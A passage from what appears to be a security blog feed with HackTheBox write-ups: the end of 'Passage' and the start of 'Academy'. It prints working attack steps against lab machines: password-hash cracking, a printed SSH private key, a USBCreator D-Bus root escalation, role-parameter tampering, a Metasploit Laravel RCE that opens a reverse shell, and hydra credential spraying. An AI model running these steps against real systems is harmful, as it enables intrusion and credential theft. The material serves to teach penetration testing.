&lt;span class="code-line"&gt;a:1:{s:4:&amp;quot;name&amp;quot;;a:1:{s:10:&amp;quot;paul-coles&amp;quot;;a:9:{s:2:&amp;quot;id&amp;quot;;s:10:&amp;quot;1592483236&amp;quot;;s:4:&amp;quot;name&amp;quot;;s:10:&amp;quot;paul-coles&amp;quot;;s:3:&amp;quot;acl&amp;quot;;s:1:&amp;quot;2&amp;quot;;s:5:&amp;quot;email&amp;quot;;s:16:&amp;quot;paul@passage.htb&amp;quot;;s:4:&amp;quot;nick&amp;quot;;s:10:&amp;quot;Paul Coles&amp;quot;;s:4:&amp;quot;pass&amp;quot;;s:64:&amp;quot;e26f3e86d1f8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd&amp;quot;;s:3:&amp;quot;lts&amp;quot;;s:10:&amp;quot;1592485556&amp;quot;;s:3:&amp;quot;ban&amp;quot;;s:1:&amp;quot;0&amp;quot;;s:3:&amp;quot;cnt&amp;quot;;s:1:&amp;quot;2&amp;quot;;}}}&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We grab all the hashes and crack them using &lt;code&gt;john&lt;/code&gt; and the rockyou wordlist.
&lt;code&gt;Paul&lt;/code&gt;'s password is &lt;code&gt;atlanta1&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;[maggick@fomalhaut ~]$ john hash -w=~/tools/password_lists/rockyou.txt --fork=8 --rules --format=Raw-SHA256&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 4 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 AVX 4x])&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: OpenMP was disabled due to --fork; a non-OpenMP build may be faster&lt;/span&gt;
&lt;span class="code-line"&gt;Node numbers 1-8 of 8 (fork)&lt;/span&gt;
&lt;span class="code-line"&gt;Each node loaded 1/8 of wordfile to memory (about 16 MB/node)&lt;/span&gt;
&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
&lt;span class="code-line"&gt;atlanta1         (paul)&lt;/span&gt;
&lt;span class="code-line"&gt;Waiting for 7 children to terminate&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We open a shell, and try to switch user but we cannot use &lt;code&gt;su&lt;/code&gt; as we don't have
a proper terminal. Using
&lt;a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell"&gt;Payload all the things cheatsheet&lt;/a&gt;
we get an interactive shell and get logged in as &lt;code&gt;paul&lt;/code&gt; and grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;meterpreter &amp;gt; shell&lt;/span&gt;
&lt;span class="code-line"&gt;Process 3053 created.&lt;/span&gt;
&lt;span class="code-line"&gt;Channel 14 created.&lt;/span&gt;
&lt;span class="code-line"&gt;  su &lt;/span&gt;
&lt;span class="code-line"&gt;su: must be run from a terminal&lt;/span&gt;
&lt;span class="code-line"&gt;/usr/bin/script -qc /bin/bash /dev/null                  &lt;/span&gt;
&lt;span class="code-line"&gt;www-data@passage:/var/www/html/CuteNews/cdata/users$ su paul&lt;/span&gt;
&lt;span class="code-line"&gt;su paul&lt;/span&gt;
&lt;span class="code-line"&gt;Password: atlanta1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;paul@passage:/var/www/html/CuteNews/cdata/users$ cd&lt;/span&gt;
&lt;span class="code-line"&gt;cd&lt;/span&gt;
&lt;span class="code-line"&gt;paul@passage:~$ cat user.txt&lt;/span&gt;
&lt;span class="code-line"&gt;cat user.txt &lt;/span&gt;
&lt;span class="code-line"&gt;c9e5ea0c3e42965404e9cf34eaee71bd&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="root"&gt;Root&lt;/h1&gt;
&lt;p&gt;We grab the SSH key in paul's &lt;code&gt;.ssh&lt;/code&gt; folder. The associated public key show us
that this is &lt;code&gt;nadav&lt;/code&gt; public (and private) key.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat .ssh/id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzXiscFGV3l9T2gvXOkh9w+BpPnhFv5AOPagArgzWDk9uUq7/4v4kuzso/lAvQIg2gYaEHlDdpqd9gCYA7tg76N5RLbroGqA6Po91Q69PQadLsziJnYumbhClgPLGuBj06YKDktI3bo/H3jxYTXY3kfIUKo3WFnoVZiTmvKLDkAlO/+S2tYQa7wMleSR01pP4VExxPW4xDfbLnnp9zOUVBpdCMHl8lRdgogOQuEadRNRwCdIkmMEY5efV3YsYcwBwc6h/ZB4u8xPyH3yFlBNR7JADkn7ZFnrdvTh3OY+kLEr6FuiSyOEWhcPybkM5hxdL9ge9bWreSfNC1122qq49d nadav@passage&lt;/span&gt;
&lt;span class="code-line"&gt;paul@passage:~$ cat .ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;cat .ssh/id_rsa&lt;/span&gt;
&lt;span class="code-line"&gt;-----BEGIN RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;MIIEpAIBAAKCAQEAs14rHBRld5fU9oL1zpIfcPgaT54Rb+QDj2oAK4M1g5PblKu/&lt;/span&gt;
&lt;span class="code-line"&gt;+L+JLs7KP5QL0CINoGGhB5Q3aanfYAmAO7YO+jeUS266BqgOj6PdUOvT0GnS7M4i&lt;/span&gt;
&lt;span class="code-line"&gt;Z2Lpm4QpYDyxrgY9OmCg5LSN26Px948WE12N5HyFCqN1hZ6FWYk5ryiw5AJTv/kt&lt;/span&gt;
&lt;span class="code-line"&gt;rWEGu8DJXkkdNaT+FRMcT1uMQ32y556fczlFQaXQjB5fJUXYKIDkLhGnUTUcAnSJ&lt;/span&gt;
&lt;span class="code-line"&gt;JjBGOXn1d2LGHMAcHOof2QeLvMT8h98hZQTUeyQA5J+2RZ63b04dzmPpCxK+hbok&lt;/span&gt;
&lt;span class="code-line"&gt;sjhFoXD8m5DOYcXS/YHvW1q3knzQtddtqquPXQIDAQABAoIBAGwqMHMJdbrt67YQ&lt;/span&gt;
&lt;span class="code-line"&gt;eWztv1ofs7YpizhfVypH8PxMbpv/MR5xiB3YW0DH4Tz/6TPFJVR/K11nqxbkItlG&lt;/span&gt;
&lt;span class="code-line"&gt;QXdArb2EgMAQcMwM0mManR7sZ9o5xsGY+TRBeMCYrV7kmv1ns8qddMkWfKlkL0lr&lt;/span&gt;
&lt;span class="code-line"&gt;lxNsimGsGYq10ewXETFSSF/xeOK15hp5rzwZwrmI9No4FFrX6P0r7rdOaxswSFAh&lt;/span&gt;
&lt;span class="code-line"&gt;zWd1GhYk+Z3qYUhCE0AxHxpM0DlNVFrIwc0DnM5jogO6JDxHkzXaDUj/A0jnjMMz&lt;/span&gt;
&lt;span class="code-line"&gt;R0AyP/AEw7HmvcrSoFRx6k/NtzaePzIa2CuGDkz/G6OEhNVd2S8/enlxf51MIO/k&lt;/span&gt;
&lt;span class="code-line"&gt;7u1gB70CgYEA1zLGA35J1HW7IcgOK7m2HGMdueM4BX8z8GrPIk6MLZ6w9X6yoBio&lt;/span&gt;
&lt;span class="code-line"&gt;GS3B3ngOKyHVGFeQrpwT1a/cxdEi8yetXj9FJd7yg2kIeuDPp+gmHZhVHGcwE6C4&lt;/span&gt;
&lt;span class="code-line"&gt;IuVrqUgz4FzyH1ZFg37embvutkIBv3FVyF7RRqFX/6y6X1Vbtk7kXsMCgYEA1WBE&lt;/span&gt;
&lt;span class="code-line"&gt;LuhRFMDaEIdfA16CotRuwwpQS/WeZ8Q5loOj9+hm7wYCtGpbdS9urDHaMZUHysSR&lt;/span&gt;
&lt;span class="code-line"&gt;AHRFxITr4Sbi51BHUsnwHzJZ0o6tRFMXacN93g3Y2bT9yZ2zj9kwGM25ySizEWH0&lt;/span&gt;
&lt;span class="code-line"&gt;VvPKeRYMlGnXqBvJoRE43wdQaPGYgW2bj6Ylt18CgYBRzSsYCNlnuZj4rmM0m9Nt&lt;/span&gt;
&lt;span class="code-line"&gt;1v9lucmBzWig6vjxwYnnjXsW1qJv2O+NIqefOWOpYaLvLdoBhbLEd6UkTOtMIrj0&lt;/span&gt;
&lt;span class="code-line"&gt;KnjOfIETEsn2a56D5OsYNN+lfFP6Ig3ctfjG0Htnve0LnG+wHHnhVl7XSSAA9cP1&lt;/span&gt;
&lt;span class="code-line"&gt;9pT2lD4vIil2M6w5EKQeoQKBgQCMMs16GLE1tqVRWPEH8LBbNsN0KbGqxz8GpTrF&lt;/span&gt;
&lt;span class="code-line"&gt;d8dj23LOuJ9MVdmz/K92OudHzsko5ND1gHBa+I9YB8ns/KVwczjv9pBoNdEI5KOs&lt;/span&gt;
&lt;span class="code-line"&gt;nYN1RJnoKfDa6WCTMrxUf9ADqVdHI5p9C4BM4Tzwwz6suV1ZFEzO1ipyWdO/rvoY&lt;/span&gt;
&lt;span class="code-line"&gt;f62mdwKBgQCCvj96lWy41Uofc8y65CJi126M+9OElbhskRiWlB3OIDb51mbSYgyM&lt;/span&gt;
&lt;span class="code-line"&gt;Uxu7T8HY2CcWiKGe+TEX6mw9VFxaOyiBm8ReSC7Sk21GASy8KgqtfZy7pZGvazDs&lt;/span&gt;
&lt;span class="code-line"&gt;OR3ygpKs09yu7svQi8j2qwc7FL6DER74yws+f538hI7SHBv9fYPVyw==&lt;/span&gt;
&lt;span class="code-line"&gt;-----END RSA PRIVATE KEY-----&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;So we just us the SSH key to connect as &lt;code&gt;nadav&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ ssh -l nadav 10.10.10.206 -i .ssh/id_rsa-2&lt;/span&gt;
&lt;span class="code-line"&gt;load pubkey &amp;quot;.ssh/id_rsa-2&amp;quot;: invalid format&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Mon Sep 14 04:54:44 2020 from 10.10.14.5&lt;/span&gt;
&lt;span class="code-line"&gt;nadav@passage:~$ id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=1000(nadav) gid=1000(nadav) groups=1000(nadav),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We look at the files in the home folder. In .viminfo we found that one of the
latest edited file is about USBCreator.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Jumplist (newest first):&lt;/span&gt;
&lt;span class="code-line"&gt;-&amp;#39;  12  7  /etc/dbus-1/system.d/com.ubuntu.USBCreator.conf&lt;/span&gt;
&lt;span class="code-line"&gt;-&amp;#39;  2  0  /etc/polkit-1/localauthority.conf.d/51-ubuntu-admin.conf&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;A quick Google search lead us a &lt;a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/"&gt;blog post&lt;/a&gt;
with an USBCreator privilege escalation exploit allowing to write a file on the system as
root. We reproduce the steps in order to copy &lt;code&gt;nadav&lt;/code&gt;'s &lt;code&gt;authorized_keys&lt;/code&gt; file in
the &lt;code&gt;root&lt;/code&gt;'s &lt;code&gt;.ssh&lt;/code&gt; directory. We can then connect as &lt;code&gt;root&lt;/code&gt; with our SSH key
and get the flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;nadav@passage:~$ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys true&lt;/span&gt;
&lt;span class="code-line"&gt;()&lt;/span&gt;
&lt;span class="code-line"&gt;nadav@passage:~$ logout&lt;/span&gt;
&lt;span class="code-line"&gt;Connection to 10.10.10.206 closed.&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ ssh -l nadav 10.10.10.206 -i .ssh/id_rsa-2&lt;/span&gt;
&lt;span class="code-line"&gt;load pubkey &amp;quot;.ssh/id_rsa-2&amp;quot;: invalid format&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Mon Sep 14 05:13:56 2020 from 127.0.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;nadav@passage:~$ logout&lt;/span&gt;
&lt;span class="code-line"&gt;Connection to 10.10.10.206 closed.&lt;/span&gt;
&lt;span class="code-line"&gt;kali@kali:~$ ssh -l root 10.10.10.206 -i .ssh/id_rsa-2&lt;/span&gt;
&lt;span class="code-line"&gt;load pubkey &amp;quot;.ssh/id_rsa-2&amp;quot;: invalid format&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Mon Aug 31 15:14:22 2020 from 127.0.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;root@passage:~# id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=0(root) gid=0(root) groups=0(root)&lt;/span&gt;
&lt;span class="code-line"&gt;root@passage:~# cat root.txt o&lt;/span&gt;
&lt;span class="code-line"&gt;db9c53fcf5bde2fa5a591bcb948a1d3a&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;This box was quit easy. Not to much rabbit hole. At the end this is just the
chaining of two public exploits. I will recommend it for beginners.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category></entry><entry><title>HTB: Academy</title><link href="https://maggick.fr/2021/02/htb-academy.html" rel="alternate"></link><published>2021-02-28T10:00:00+01:00</published><updated>2021-02-28T10:00:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2021-02-28:/2021/02/htb-academy.html</id><summary type="html">&lt;p&gt;&lt;img alt="Academy card" class="align-left" src="/media/2021.02/academy_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/297"&gt;Academy&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; and publish on
November 7, 2020.
This box is classified as an easy machine. The user part involve a public
exploit and some enumeration. The root part implies enumeration and a &lt;code&gt;sudo&lt;/code&gt;
binary.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2021.02/academy_card.png" alt="Academy card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/297"&gt;Academy&lt;/a&gt; created by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; and publish on
November 7, 2020.
This box is classified as an easy machine. The user part involve a public
exploit and some enumeration. The root part implies enumeration and a &lt;code&gt;sudo&lt;/code&gt;
binary.&lt;/p&gt;


&lt;h1 id="user"&gt;User&lt;/h1&gt;
&lt;h2 id="recon"&gt;Recon&lt;/h2&gt;
&lt;p&gt;We start with an nmap scan. Only ports 22 (SSH), 80 (HTTP) and 33060 (MYSQL) are open.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.91 scan initiated Wed Nov  11 03:19:47 2020 as: nmap -p- -oN nmap 10.129.39.166&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.129.39.166&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.012s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65532 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE&lt;/span&gt;
&lt;span class="code-line"&gt;22/tcp    open  ssh&lt;/span&gt;
&lt;span class="code-line"&gt;80/tcp    open  http&lt;/span&gt;
&lt;span class="code-line"&gt;33060/tcp open  mysqlx&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Wed Nov  11 03:19:55 2020 -- 1 IP address (1 host up) scanned in 8.25 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="web"&gt;Web&lt;/h2&gt;
&lt;p&gt;The website is a new HTB feature (as was &lt;a href="/2019/09/htb-swagshop.html"&gt;swagshop&lt;/a&gt;)
&lt;strong&gt;Academy&lt;/strong&gt;. We can register an account but most of the functionalities are not
working.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Academy homepage" src="/media/2021.02/academy_01.png"&gt;&lt;/p&gt;
&lt;p&gt;We run a &lt;code&gt;dirb&lt;/code&gt; on the website that allow use to find the &lt;code&gt;admin.php&lt;/code&gt; endpoint.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;$ dirb http://academy.htb/&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;DIRB v2.22&lt;/span&gt;
&lt;span class="code-line"&gt;By The Dark Raver&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;START_TIME: Wed Nov  11 03:24:21 2020&lt;/span&gt;
&lt;span class="code-line"&gt;URL_BASE: http://academy.htb/&lt;/span&gt;
&lt;span class="code-line"&gt;WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;-----------------&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;GENERATED WORDS: 4612&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;---- Scanning URL: http://academy.htb/ ----&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://academy.htb/admin.php (CODE:200|SIZE:2633)&lt;/span&gt;
&lt;span class="code-line"&gt;==&amp;gt; DIRECTORY: http://academy.htb/images/&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://academy.htb/index.php (CODE:200|SIZE:2117)&lt;/span&gt;
&lt;span class="code-line"&gt;+ http://academy.htb/server-status (CODE:403|SIZE:276)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h3 id="adminphp"&gt;admin.php&lt;/h3&gt;
&lt;p&gt;When taking a closer look at the registration request, we can see that there is
a post parameter &lt;code&gt;roleid&lt;/code&gt; set to &lt;code&gt;0&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;POST /register.php HTTP/1.1&lt;/span&gt;
&lt;span class="code-line"&gt;Host: academy.htb&lt;/span&gt;
&lt;span class="code-line"&gt;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&lt;/span&gt;
&lt;span class="code-line"&gt;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Language: en-US,en;q=0.5&lt;/span&gt;
&lt;span class="code-line"&gt;Accept-Encoding: gzip, deflate&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Type: application/x-www-form-urlencoded&lt;/span&gt;
&lt;span class="code-line"&gt;Content-Length: 44&lt;/span&gt;
&lt;span class="code-line"&gt;Origin: http://academy.htb&lt;/span&gt;
&lt;span class="code-line"&gt;Connection: close&lt;/span&gt;
&lt;span class="code-line"&gt;Referer: http://academy.htb/register.php&lt;/span&gt;
&lt;span class="code-line"&gt;Cookie: PHPSESSID=pf1cigmrl6la8c0o7lte5jubum&lt;/span&gt;
&lt;span class="code-line"&gt;Upgrade-Insecure-Requests: 1&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;uid=toto&amp;amp;password=toto&amp;amp;confirm=toto&amp;amp;roleid=0&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Using Burp and the proxy module, we change the &lt;code&gt;roleid&lt;/code&gt; parameter to &lt;code&gt;1&lt;/code&gt;. Our
new account can now log into the admin part. Which is mostly a &lt;em&gt;todo&lt;/em&gt; list,
disclosing the staging environment virtual host.&lt;/p&gt;
&lt;p&gt;&lt;img alt="Academy Launch Planner" src="/media/2021.02/academy_02.png"&gt;&lt;/p&gt;
&lt;h3 id="staging"&gt;Staging&lt;/h3&gt;
&lt;p&gt;We update our &lt;code&gt;/etc/hosts&lt;/code&gt; and browse to the staging environment.&lt;/p&gt;
&lt;p&gt;http://dev-staging-01.academy.htb/&lt;/p&gt;
&lt;p&gt;&lt;img alt="Academy staging environment" src="/media/2021.02/academy_03.png"&gt;&lt;/p&gt;
&lt;p&gt;We see in the disclosed path that the staging environment use
the &lt;a href="https://laravel.com/"&gt;laravel framework&lt;/a&gt; which as a few public exploit one
of them allowing for remote command execution.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;kali@kali:~$ searchsploit laravel&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Exploit Title                                                            |  Path&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Laravel - &amp;#39;Hash::make()&amp;#39; Password Truncation Security                     | multiple/remote/39318.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Laravel Log Viewer &amp;lt; 0.13.0 - Local File Download                         | php/webapps/44343.py&lt;/span&gt;
&lt;span class="code-line"&gt;PHP Laravel Framework 5.5.40 / 5.6.x &amp;lt; 5.6.30 - token Unserialize Remote  | linux/remote/47129.rb&lt;/span&gt;
&lt;span class="code-line"&gt;UniSharp Laravel File Manager 2.0.0 - Arbitrary File Read                 | php/webapps/48166.txt&lt;/span&gt;
&lt;span class="code-line"&gt;UniSharp Laravel File Manager 2.0.0-alpha7 - Arbitrary File Upload        | php/webapps/46389.py&lt;/span&gt;
&lt;span class="code-line"&gt;-------------------------------------------------------------------------- ---------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;Shellcodes: No Results&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;The unserialization exploit is a metasploit one. So we fire up &lt;code&gt;msf&lt;/code&gt;, load the
exploit and configure the options to use the API key (disclosed on the debug
page) and our virtual host. Then we run the exploit and get a shell as
&lt;code&gt;www-data&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (exploit/unix/http/laravel_token_unserialize_exec):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name       Current Setting                               Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----       ---------------                               --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  APP_KEY    dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=  no        The base64 encoded APP_KEY string from the .env file&lt;/span&gt;
&lt;span class="code-line"&gt;  Proxies                                                  no        A proxy chain of format type:host:port[,type:host:port][...]&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOSTS     10.129.39.166                                 yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  RPORT      80                                            yes       The target port (TCP)&lt;/span&gt;
&lt;span class="code-line"&gt;  SSL        false                                         no        Negotiate SSL/TLS for outgoing connections&lt;/span&gt;
&lt;span class="code-line"&gt;  TARGETURI  /                                             yes       Path to target webapp&lt;/span&gt;
&lt;span class="code-line"&gt;  VHOST      dev-staging-01.academy.htb                    no        HTTP server virtual host&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Started reverse TCP handler on 10.10.14.20:4444&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Command shell session 3 opened (10.10.14.20:4444 -&amp;gt; 10.129.39.166:36996) at 2020-11-11 04:11:10 -0500&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;id&lt;/span&gt;
&lt;span class="code-line"&gt;uid=33(www-data) gid=33(www-data) groups=33(www-data)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="foothold"&gt;Foothold&lt;/h2&gt;
&lt;p&gt;We start enumerating and found a few credentials sets for the database. We also
extract the users list from &lt;code&gt;/etc/passwd&lt;/code&gt; and run the retrieved creds against the
SSH service using hydra. The password stored in &lt;code&gt;acedemy/.env&lt;/code&gt; allow us to
connect as &lt;code&gt;cry0l1t3&lt;/code&gt; using SSH and grab the user flag.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat ls ../../academy/.env&lt;/span&gt;
&lt;span class="code-line"&gt;APP_NAME=Laravel&lt;/span&gt;
&lt;span class="code-line"&gt;APP_ENV=local&lt;/span&gt;
&lt;span class="code-line"&gt;APP_KEY=base64:dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0=&lt;/span&gt;
&lt;span class="code-line"&gt;APP_DEBUG=false&lt;/span&gt;
&lt;span class="code-line"&gt;APP_URL=http://localhost&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;LOG_CHANNEL=stack&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;DB_CONNECTION=mysql&lt;/span&gt;
&lt;span class="code-line"&gt;DB_HOST=127.0.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;DB_PORT=3306&lt;/span&gt;
&lt;span class="code-line"&gt;DB_DATABASE=academy&lt;/span&gt;
&lt;span class="code-line"&gt;DB_USERNAME=dev&lt;/span&gt;
&lt;span class="code-line"&gt;DB_PASSWORD=mySup3rP4s5w0rd!!&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;BROADCAST_DRIVER=log&lt;/span&gt;
&lt;span class="code-line"&gt;CACHE_DRIVER=file&lt;/span&gt;
&lt;span class="code-line"&gt;SESSION_DRIVER=file&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;$ hydra  -L users -p &amp;#39;mySup3rP4s5w0rd!!&amp;#39; ssh://10.129.39.166&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra v9.1 (c) 2020 by van Hauser/THC &amp;amp; David Maciejak&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-11-11 08:34:04&lt;/span&gt;
&lt;span class="code-line"&gt;[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4&lt;/span&gt;
